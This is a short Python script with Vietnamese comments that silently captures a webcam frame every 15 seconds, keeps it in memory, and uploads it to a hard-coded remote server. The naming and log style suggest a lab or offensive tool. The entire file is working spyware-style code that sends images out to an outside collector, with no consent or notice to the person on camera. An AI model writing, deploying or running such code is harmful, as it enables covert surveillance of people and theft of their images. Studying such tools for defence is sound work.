import time
import datetime
import requests
import cv2
import io

# URL của server nhận ảnh
SERVER_URL = "http://192.168.204.130:5000/upload"
WEBCAM_INTERVAL = 15  # khoảng thời gian chụp webcam (giây)

def send_file_to_server(file_bytes, filename):
    try:
        files = {'screenshot': (filename, file_bytes, 'image/png')}
        r = requests.post(SERVER_URL, files=files, timeout=10)
        if r.status_code == 200:
            print(f"[+] Uploaded: {filename}")
            return True
        else:
            print(f"[!] Upload failed: {r.status_code}")
            return False
    except Exception as e:
        print(f"[!] Error sending file: {e}")
        return False

def capture_webcam_loop():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[!] Không thể mở webcam")
        return

    while True:
        ret, frame = cap.read()
        if ret:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"webcam_{timestamp}.png"

            is_success, buffer = cv2.imencode(".png", frame)
            if is_success:
                file_bytes = io.BytesIO(buffer.tobytes())  # giữ dữ liệu trong RAM
                send_file_to_server(file_bytes, filename)
            else:
                print("[!] Không thể mã hóa ảnh webcam")
        else:
            print("[!] Lấy ảnh từ webcam thất bại")
        time.sleep(WEBCAM_INTERVAL)

    cap.release()

if __name__ == "__main__":
    print("[*] Starting webcam capture...")
    try:
        capture_webcam_loop()
    except KeyboardInterrupt:
        print("\n[*] Webcam capture stopped.")
